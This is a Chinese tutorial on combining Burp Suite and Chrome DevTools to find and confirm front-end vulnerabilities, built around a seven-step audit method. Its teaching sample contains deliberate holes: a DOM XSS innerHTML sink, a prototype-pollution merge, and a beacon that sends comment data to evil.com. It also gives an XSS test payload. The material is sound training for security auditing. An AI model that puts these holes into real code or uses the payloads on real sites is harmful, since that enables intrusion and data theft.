# 1.为什么需要联动
原因：Burp 是「外线侦察兵」——能拦截所有 HTTP 请求响应，但看不到浏览器内部 JS 怎么执行的。DevTools 是「内部特务」——能看到变量值、调用栈、DOM 变化，但不知道服务端发了什么响应。联动就是让侦察兵和特务对讲——Burp 告诉你「这个响应里有 innerHTML」，DevTools 帮你验证「用户输入真的能流到这里」。
## 1.1 各自能做什么、不能做什么
| 功能              | 🟠 Burp Suite          | 🟢 Chrome DevTools           |
| --------------- | ---------------------- | ---------------------------- |
| 看 HTTP 请求/响应    | ✅ 完整，正文原始内容            | ⚠️ Network 面板有，但可能被 JS 二次修改  |
| 修改请求、重放         | ✅ Repeater / Intruder  | ❌ 不支持                        |
| 搜索所有 JS 文件中的关键字 | ✅ 在 Proxy History 搜响应体 | ✅ Sources → Search all files |
| 追踪一个变量数据流       | ❌ 只能静态看文本              | ✅ 断点 + Scope 面板 + Call Stack |
| 实时看 DOM 结构      | ❌ 无浏览器渲染引擎             | ✅ Elements 面板                |
| 篡改 JS 文件并重新执行   | ❌ 不能改浏览器里的代码           | ✅ Overrides（本地覆写）            |
| 批量自动化扫描         | ✅ Scanner / Intruder   | ❌                            |
⭐ **核心认知**：Burp 负责「发现候选漏洞」（静态匹配 Sink 关键字），DevTools 负责「验证漏洞」（动态追踪数据流）。**不要跳过验证**——Burp 搜到 innerHTML 不意味着能注入，数据可能在前面被净化了。DevTools 断点追踪是唯一的确认手段。
# 2.环境配置（一次性）
## 2.1 工具位置
| 工具              | 你的环境                   | 说明                                                                     |
| --------------- | ---------------------- | ---------------------------------------------------------------------- |
| Burp Suite      | 已安装，代理端口 `8080`        | 确认：Proxy → Options → 127.0.0.1:8080                                    |
| Burp CA 证书      | 需要安装到系统/浏览器            | 访问 `http://burpsuite` 下载，导入 Chrome 受信任证书                               |
| Chrome DevTools | 浏览器内置，F12 打开           | Settings → Preferences → ⭐ 勾选 "Disable cache (while DevTools is open)" |
## 2.2 ⭐ 关键 DevTools 设置
1. F12 打开 DevTools → 右上角齿轮 ⚙ → Preferences
2. Network 组：勾选 Disable cache (while DevTools is open)——防缓存，确保每次都拉最新 JS
3. Sources 组：勾选 Enable JavaScript source maps——方便看源码（如果目标有 source map）
4. Console 组：勾选 Preserve log upon navigation——页面跳转后日志不丢
5. 切换到 Network 面板，勾选 Preserve log——同上
**为什么「缓存禁用」那么重要**？当 Burp 拦截了一个 JS 响应、修改后放行，但如果浏览器缓存了旧版本，修改就不会生效。关闭缓存后，DevTools 每次强制重新请求，Burp 才能劫持到。
# 3.标准审计七步法
下面是一个真实审计的完整流程。记住这个顺序——它被设计成「先宏观、再微观」的效率最优路径。

## ①Burp：抓包，收集所有 JS 文件
打开 Burp 拦截，正常浏览目标网站所有功能。然后去 Proxy → HTTP history → Filter（过滤栏）筛选 MIME type: script，导出所有 JS URL 列表。
💡 为什么要收集全部 JS？有些 JS 是按需加载的（路由分割、懒加载），不把所有功能点一遍会漏掉关键文件。

## ②Burp：搜索 Sink 关键字
在 Burp 的 Proxy history 里，用搜索功能（Ctrl+F，搜响应体）扫一遍关键字：
```
innerHTML    outerHTML    document.write    eval(    new Function(
setTimeout(    setInterval(    location    merge(    extend(
__proto__    constructor    createElement('script')
```
⭐ 技巧：Burp 的搜索结果会高亮显示行号。对每个命中，右键 → "Send to Repeater" 保留上下文。

## ③DevTools：打开可疑 JS → 搜索同样的关键字
在 DevTools 的 Sources 面板 → 左侧文件树找到被 Burp 标记的 JS 文件 → Ctrl+Shift+F 全局搜索。DevTools 的搜索还能看到代码美化后的格式（右下角 {} pretty print 按钮）。

## ④DevTools：设断点，追踪数据流
⭐ 这是最关键的一步。在可疑 Sink 那一行左侧行号单击设断点（蓝标），然后触发相关功能（点按钮、改 URL hash 等）。断点命中后：

| 看哪里           | 看什么                               |
| ------------- | --------------------------------- |
| Scope 面板      | 当前作用域变量值。追踪 Sink 的入参是什么，从哪来的      |
| Call Stack 面板 | 函数调用链。从哪行调到了这里？中间经过了哪些函数？<br>     |
| Watch 面板      | 自定义表达式。比如加 location.hash 看当前值<br> |

## ⑤DevTools Console：即时测试 Payload
断点状态下，Console 的作用域就是断点的作用域。直接在 Console 里输入变量名看值，或者手工调用 Sink 测试注入：
```js
// 断点时在 Console 测试
document.body.innerHTML = '<img src=x onerror=alert(1)>';  // 看是否弹窗
```

## ⑥Burp Repeater：修改请求，验证远程利用
如果漏洞依赖特定请求参数（如 POST body 中的 JSON），用 Burp Repeater 构造攻击请求、发到服务端、观察响应是否含注入。这是确认「能在真实场景利用」的最后一步。

## ⑦DevTools Overrides：本地修改 JS，验证修复
在 Sources 面板右键 JS 文件 → "Override content" → 修改代码（如 innerHTML 改 textContent）→ Ctrl+S 保存 → 刷新页面，验证修复后漏洞是否消失。这是给客户写报告前的自检。
💡 Overrides 的本质是浏览器「从本地文件夹读文件，不发 HTTP 请求」。你改的 JS 只在你本地生效，不影响服务端。

> [!important]   七步法口诀
> 抓（Burp抓包）→ 搜（Burp搜Sink）→ 定位（DevTools定位文件）→ 断（设断点追踪）→ 试（Console试Payload）→ 验（Repeater验证利用）→ 修（Overrides验证修复）。前三步找目标，中间两步确认漏洞，后两步完成审计闭环。

## 3.在DevTools中查看源码
```js
// ⭐ 留言板 JS（模拟真实页面代码，含 2 个漏洞）
(function() {
  var _conf = {};

  // 深度合并（第 9 课老朋友了）
  function merge(target, source) {
    for (var key in source) {
      if (typeof target[key] === 'object' && typeof source[key] === 'object') {
        merge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
    return target;
  }

  // 读取 URL 参数
  function getParam(name) {
    var m = location.search.match(new RegExp(name + '=([^&]*)'));
    return m ? decodeURIComponent(m[1]) : null;
  }

  // ⭐ 渲染评论列表（漏洞点 #1）
  function renderComments(comments) {
    var container = document.getElementById('comment-list');
    var html = '';
    comments.forEach(function(c) {
      html += '<div class="comment"><strong>' + c.author + '</strong>: ' + c.body + '</div>';
    });
    container.innerHTML = html;   // ⭐ Sink 1: DOM XSS
  }

  // ⭐ 创建评论（漏洞点 #2）
  function createComment(author, body) {
    var newCfg = getParam('config');        // ⭐ Source: location.search
    if (newCfg) {
      try {
        merge(_conf, JSON.parse(newCfg));   // ⭐ Sink 2: 原型链污染入口
      } catch(e) {}
    }

    // ⭐ 如果被污染成 admin，额外行为
    if (_conf.admin) {
      // 发请求把评论数据外发
      var img = new Image();
      img.src = 'https://evil.com/log?c=' + encodeURIComponent(body);
      //                                                      ⭐ Sink 3: 数据外发
    }

    return { author: author, body: body, time: Date.now() };
  }

  // 页面初始化
  var comments = [];
  var initComment = getParam('comment');
  if (initComment) {
    comments.push(createComment('访客', initComment));
  }
  comments.push(createComment('系统', '欢迎使用留言板'));
  renderComments(comments);
})();
```

# 5.DevTools 关键面板速查（审计专用）
| 面板          | 审计时用来做什么                                                                         | 快捷键                        |
| ----------- | -------------------------------------------------------------------------------- | -------------------------- |
| Elements    | 看 DOM 树——找 `id` / `class` 定位注入点；右键 → Break on → subtree modifications（DOM 变化时断点） | Ctrl+Shift+C               |
| Sources     | ⭐ 核心面板：看所有 JS 文件、Pretty Print `{}`、设断点、Overrides 本地改文件；左下角 "Snippets" 可以写临时测试脚本  | Ctrl+Shift+I → Sources     |
| Network     | 看所有请求的完整信息（Headers、Response）；右键 → "Copy as fetch" → 贴到 Console 重放                | Ctrl+Shift+I → Network     |
| Console     | 断点状态下实时测试 JS 表达式、调用函数、查看变量值；`copy(obj)` 把对象复制到剪贴板                                | Esc（任意面板下打开）               |
| Application | 看 Cookie、LocalStorage、SessionStorage——如果 JS 从这些地方读数据写 DOM，且值可控，就是潜在 Source       | Ctrl+Shift+I → Application |
| Security    | 看 CSP（Content Security Policy）配置——判断 CSP 能不能绕过                                   | Ctrl+Shift+I → Security    |
> [!important]   容易被忽略但超有用的功能：
> - `Sources` → `XHR/fetch Breakpoints`：可以设「任何 fetch 请求发出去时断点」。审计时用它拦截外发请求，看数据跑哪了。
> - `Elements` → `Event Listeners`：选中一个 DOM 元素，右侧面板显示所有绑定的事件。找 onclick/onchange 等是不是从用户输入接了数据。
>  - `Network` → `right-click` → `"Block request URL"`：临时屏蔽某个 JS 文件，看页面没了它之后行为怎么变（判断哪段 JS 负责什么功能）。

# 6.核心要点
| 概念            | 一句话                                                                     |
| ------------- | ----------------------------------------------------------------------- |
| 联动本质          | Burp 发现候选漏洞 → DevTools 验证并追踪数据流 → Overrides 验证修复                        |
| ⭐ 七步法         | 抓包 → 搜索 Sink → 定位文件 → 设断点追踪 → Console 测试 → Repeater 验证 → Overrides 修复验证 |
| DevTools 禁用缓存 | `Disable cache` 保证每次拉最新 JS，Burp 才能拦截到                                   |
| 断点三面板         | Scope（看变量值）+ Call Stack（看调用链）+ Watch（自定义表达式）                            |
| Overrides     | 本地替换 JS 文件，验证修复方案，不影响服务端                                                |
| XHR 断点        | 拦截所有 fetch/XMLHttpRequest，追踪外发数据到哪了                                     |
